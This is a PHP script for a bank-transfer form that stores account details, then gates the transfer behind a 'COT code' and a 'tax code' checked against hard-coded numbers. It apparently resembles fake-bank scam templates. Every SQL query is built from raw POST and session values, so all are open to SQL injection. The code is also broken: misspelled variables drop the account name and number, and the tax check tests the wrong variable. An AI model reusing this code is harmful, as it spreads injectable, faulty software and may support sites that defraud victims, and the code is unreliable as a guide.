<?php
include ('config.php');
include ('auth.php');
session_start();


if (isset($_POST['transfer'])) {

$bankname = $_POST['bankname'];
$accountnumber = $_POST['accountnumber'];
$accountname = $_POST['accountname'];
$swift = $_POST['swift'];
$aba = $_POST['aba'];
$amount = $_POST['amount'];
$address = $_POST['address'];
$transferid = md5($userid);


                    $sql = "INSERT INTO `transfers` (`id`, `userid`, `bankname`, `accountname`, `accountnumber`, `swift`, `aba`, `address`, `amount`, `cot`, `tax`, `transferid`)
                    VALUES (NULL, '$userid', '$bankname', '$acountname', '$accountnumeber', '$swift', '$aba', '$address', '$amount', '', '', '$transferid')";
                    
                    if (mysqli_query($conn, $sql)) {
                        $_SESSION['transferid']=$transferid;
                        header('Location: '.'transfer-cot.php');
                        
                    } else {
                        echo "Error: " . $sql . "<br>" . mysqli_error($conn);
                    }
        
                mysqli_close($conn);
         
         
         
         
}


if (isset($_POST['cot'])) {
 $tranid = $_SESSION['transferid'];
 $cot = $_POST['cot'];
 $sql = "UPDATE transfers SET cot='$cot' WHERE transferid='$tranid'";


if ($cot != 7456832){
    
    echo "Invalid COT code";
    
} else{

if (mysqli_query($conn, $sql)) {
    
    header('Location: '.'transfer-tax.php');
} else {
    echo "Error updating record: " . mysqli_error($conn);
}

mysqli_close($conn);
 
    
}
}


if (isset($_POST['tax'])) {
 $tranid = $_SESSION['transferid'];
 $tax = $_POST['tax'];
 $sql = "UPDATE transfers SET tax='$tax' WHERE transferid='$tranid'";
 
 
if ($cot != 66725656){
    
    echo "Invalid Tax code";
    
} else{

if (mysqli_query($conn, $sql)) {
    
    header('Location: '.'app-success2.php');
} else {
    echo "Error updating record: " . mysqli_error($conn);
}

mysqli_close($conn);
 
    
}

}

?>